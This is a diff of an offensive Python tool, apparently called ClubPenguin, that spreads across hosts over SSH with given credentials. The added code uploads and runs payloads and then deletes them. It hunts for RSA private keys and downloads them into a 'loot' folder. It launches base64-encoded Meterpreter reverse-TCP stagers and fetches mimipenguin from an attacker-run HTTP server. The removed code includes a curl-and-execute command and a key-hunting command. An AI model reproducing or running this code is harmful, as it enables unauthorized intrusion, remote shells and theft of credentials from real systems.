@@ -16,6 +16,7 @@ import ssl
 import requests
 import os
 import random
+import string
 
 CRED = '\033[91m'
 CEND = '\033[0m'
@@ -23,45 +24,27 @@ CGREEN  = '\33[32m'
 CYELLOW = '\33[33m'
 
 
-class myssh:
-    def __init__(self, host, user, password, port=22):
-        client = paramiko.SSHClient()
-        client.load_system_host_keys()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        print CYELLOW + "[*] Connecting to " + str(host) + "..." + CEND
-        client.connect(host, port=port, username=user, password=password, timeout=1)
-        atexit.register(client.close)
-        self.client = client
-
-    def __call__(self, command, timeout, ip):
-        stdin, stdout, stderr = self.client.exec_command(command, timeout=timeout)
-        try:
-            sshdata = stdout.readlines()
-            print CGREEN + "[+] Executed on " + str(ip) + "!" + CEND
-            for line in sshdata:
-                print(line)
-        except socket.error:
-            print CGREEN + "[+] Command sent to " + ip + "..." + CEND
+def randomword(length):
+   letters = string.ascii_lowercase
+   return ''.join(random.choice(letters) for i in range(length))
 
 
-def execute_commands(targets, port, username, password, commands, timeout):
-    for ip in targets:
-        try:
-            remote = myssh(str(ip), username, password)
-            for command in commands:
-                remote(command, timeout, str(ip))
-        except socket.timeout:
-            print CRED + "[-] Failed to connect to " + str(ip) + CEND
-        except socket.error:
-            print CRED + "[-] Failed to connect to " + str(ip) + CEND
-        except paramiko.ssh_exception.AuthenticationException:
-            print CRED + "[-] Authentication failed!"
-
-
-def workon(ip, username,password, command, timeout):
+def copy_exec(ip, username, password, file, timeout):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
     try:
-        remote = myssh(str(ip), username, password)
-        remote(command, timeout, str(ip))
+        client.connect(str(ip), port=22, username=username, password=password, timeout=1)
+        sftp = client.open_sftp()
+        sftp.put('output/' + file, file)
+        print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
+        print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
+        stdin, stdout, stderr = client.exec_command(" chmod +x "+ file +"; sleep 1; rm "+ file + " & ./" + file, timeout=timeout)
+        try:
+            for line in stdout:
+                print line
+        except socket.timeout:
+            pass
     except socket.timeout:
         print CRED + "[-] Failed to connect to " + str(ip) + CEND
     except socket.error:
@@ -70,16 +53,70 @@ def workon(ip, username,password, command, timeout):
         print CRED + "[!] Authentication failed!" + CEND
 
 
-def execute_command(targets, port, username, password, command, timeout):
-    threads = []
+def steal_keys(ip, username, password, timeout):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
+    try:
+        client.connect(str(ip), port=22, username=username, password=password, timeout=1)
+        stdin, stdout, stderr = client.exec_command("find /home/ /root/ /Users/Spartan/Documents -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null ", timeout=timeout)
+        try:
+            sftp = client.open_sftp()
+            for line in stdout:
+                line = line.rstrip()
+                if not os.path.exists("loot/keys/" + str(ip)):
+                    os.makedirs("loot/keys/" + str(ip))
+                print CGREEN + "[+] Copying " + line + " from " + str(ip) + "!" + CEND
+                sftp.get(line, "loot/keys/" + str(ip) + "/" + line.replace("/", "_"))
+            #sftp.close()
+        except socket.timeout:
+            pass
+    except socket.timeout:
+        print CRED + "[-] Failed to connect to " + str(ip) + CEND
+    except socket.error:
+        print CRED + "[-] Failed to connect to " + str(ip) + CEND
+    except paramiko.ssh_exception.AuthenticationException:
+        print CRED + "[!] Authentication failed!" + CEND
+
+
+def execute_command(ip, username, password, command, timeout):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
+    try:
+        client.connect(str(ip), port=22, username=username, password=password, timeout=1)
+        try:
+            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
+            print CGREEN + "[+] Executed on " + str(ip) + "!" + CEND
+            for line in stdout:
+                print line
+        except socket.timeout:
+            print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
+    except socket.timeout:
+        print CRED + "[-] Failed to connect to " + str(ip) + CEND
+    except socket.error:
+        print CRED + "[-] Failed to connect to " + str(ip) + CEND
+    except paramiko.ssh_exception.AuthenticationException:
+        print CRED + "[!] Authentication failed!" + CEND
+
+
+def start_thread(targets, function, args):
     for ip in targets:
-        t = threading.Thread(target=workon, args=(ip,username,password, command, timeout))
-        t.start()
-        #t.join()
-        time.sleep(1)
+        if function == "execute_command":
+            t = threading.Thread(target=execute_command, args=(ip,args[1],args[2],args[3],args[4]))
+            t.start()
+        time.sleep(.5)
+        if function == "copy_exec":
+            t = threading.Thread(target=copy_exec, args=(ip, args[1], args[2], args[3], args[4]))
+            t.start()
+        time.sleep(.5)
+        if function == "steal_keys":
+            t = threading.Thread(target=steal_keys, args=(ip, args[1], args[2], args[3]))
+            t.start()
+        time.sleep(.5)
 
 
-def stager_meterpreter_python(listen_ip, listen_port, ip, port, username, password):
+def stager_meterpreter_python(listen_ip, listen_port, targets, port, username, password):
     stager = '''
 import socket,struct,time
 for x in range(10):
@@ -98,10 +135,11 @@ exec(d,{'s':s})
     ''' % (listen_ip, listen_port)
     payload = base64.b64encode(stager, 'utf-8')
     print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: python/meterpreter/reverse_tcp" + CEND
-    execute_command(ip, port, username, password, "echo \"import base64,sys;exec(base64.b64decode({2:str,3:lambda"
-     " b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + payload + "'))) \" | python &", 5)
+    command = "echo \"import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + payload + "'))) \" | python &"
+    start_thread(targets, "execute_command", [22, username, password, command, 1])
 
-def stager_meterpreter_php(listen_ip, listen_port, ip, port, username, password):
+
+def stager_meterpreter_php(listen_ip, listen_port, targets, port, username, password):
 
         stager = '''
     error_reporting(0);
@@ -158,8 +196,8 @@ def stager_meterpreter_php(listen_ip, listen_port, ip, port, username, password)
     ''' % (listen_ip, listen_port)
         payload = base64.b64encode(stager, 'utf-8')
         print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: php/meterpreter/reverse_tcp" + CEND
-        execute_command(ip, port, username, password, "php -r 'eval(base64_decode(\"" + payload + "\"));'", 1)
-
+        command = "php -r 'eval(base64_decode(\"" + payload + "\"));'"
+        start_thread(targets, "execute_command", [22, username, password, command, 1])
 
 def start_server(a,PORT):
     Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
@@ -179,9 +217,9 @@ def mimipenguin(lhost, lport, targets, port, username, password):
     print CGREEN + "[!] Spinning up HTTP server..." + CEND
     thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
     time.sleep(3)
-    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/mimipenguin.py'); exec(r.read());\" | python &"
+    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/payloads/mimipenguin.py'); exec(r.read());\" | python &"
     print CGREEN + "[!] Executing mimipenguin on the targets, this may take a while..." + CEND
-    execute_command(targets, port, username, password, command, 300)
+    start_thread(targets, "execute_command", [22, username, password, command, 100])
 
 
 def parse_targets(target):
@@ -222,19 +260,11 @@ def shellcode_meterpreter_64(port,ip):
     return shellcode
 
 
-def macho(lhost, lport, targets, port, username, password, m_ip, m_port):
-    with open('meterpreter_baseline', 'r') as file:
+def build_macho(m_ip, m_port):
+    with open('templates/meterpreter_baseline', 'r') as file:
         filedata = file.read()
     filedata = filedata.replace('100.100.100.100:65535\"\x20', m_ip + ':' + m_port + '\"\x20' + (20 - len(m_ip+m_port)) * "\x00")
-    with open('output/meterpreter.txt', 'w') as file:
-        encoded = base64.b64encode(filedata)
-        file.write(encoded)
-    print CGREEN + "[!] Spinning up HTTP server..." + CEND
-    thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
-    time.sleep(3)
-    command = "curl http://" + str(lhost) + ":" + str(lport) + "/output/meterpreter.txt | base64 -D > output; chmod +x output; sleep 1; rm output & ./output"
-    print CGREEN + "Attempting to execute MacOS x64 meterpreter... \nHandler: " + str(m_ip) + ":" + str(m_port) + " \nPayload: osx/x64/meterpreter_reverse_tcp" + CEND
-    execute_command(targets, port, username, password, command, 2)
+    return filedata
 
 
 def invoke_shellcode(shellcode):
@@ -278,12 +308,6 @@ def make_port(port):
     return hex_port
 
 
-def hunt_keys(targets, username, password):
-    command = "echo \"SSH commands found in history:\";find /home /root -name .*_history 2>/dev/null | xargs grep -H \"ssh .*-i\";echo \"Private Keys found:\";find /home/ /root/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null | xargs -d \"\\n\" tail -vn +1"
-    print CGREEN + "[!] Searching history files for SSH key usage and searching system for private keys..." + CEND
-    execute_command(targets, 22, username, password, command, 300)
-
-
 def main():
     parser = argparse.ArgumentParser(description='ClubPenguin')
     parser.add_argument("first_arg", nargs=1)
@@ -298,7 +322,7 @@ def main():
 
     if args.command:
         print CGREEN + "[!] Running custom command " + "\"" + args.command + "\"..." + CEND
-        execute_command(targets, 22, args.username, args.password, args.command, 100)
+        start_thread(targets, "execute_command", [22, args.username, args.password, args.command, 100])
     if args.options:
         options = dict(x.split('=') for x in args.options.split(' '))
 
@@ -311,10 +335,10 @@ def main():
             except KeyError:
                 print "Must supply an LHOST for use with mimipenguin"
                 exit()
-
         mimipenguin(get_ip(), lport, targets, 22, args.username, args.password)
     if args.module == "keys":
-        hunt_keys(targets, args.username, args.password)
+        print CGREEN + "[!] Searching system for private keys..." + CEND
+        start_thread(targets, "steal_keys", [22, args.username, args.password, 100])
     if args.module == "meterpreter":
         if not args.options:
             print "The meterpreter module requires options, You must provide an LHOST and LPORT"
@@ -333,7 +357,6 @@ def main():
             type = options['TYPE']
         except KeyError:
             type = 'python'
-
         if type == 'python':
             stager_meterpreter_python(m_ip, m_port, targets, 22, args.username, args.password)
         if type == 'php':
@@ -341,12 +364,8 @@ def main():
         if type == '64':
             command = invoke_shellcode(shellcode_meterpreter_64(m_port, m_ip))
             print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port) + " \nPayload: linux/x64/meterpreter/reverse_tcp" +  CEND
-            execute_command(targets, 22, args.username, args.password, command, 1)
+            start_thread(targets, "execute_command", [22, args.username, args.password, args.command, 100])
         if type == 'osx':
-            try:
-                lport = options['LISTEN']
-            except:
-                lport = 8080
             try:
                 m_ip = options['LHOST']
             except KeyError:
@@ -357,11 +376,11 @@ def main():
             except KeyError:
                 print "Must supply an LPORT for use with meterpreter"
                 exit()
-            macho(get_ip(), lport, targets, 22, args.username, args.password, m_ip, m_port)
-
-
-
-
+            payload = build_macho(m_ip, m_port)
+            filename = randomword(10)
+            with open('output/' + filename, 'w') as file:
+                file.write(payload)
+            start_thread(targets, "copy_exec", [22, args.username, args.password, filename, 2])
 
 if __name__ == "__main__":
 
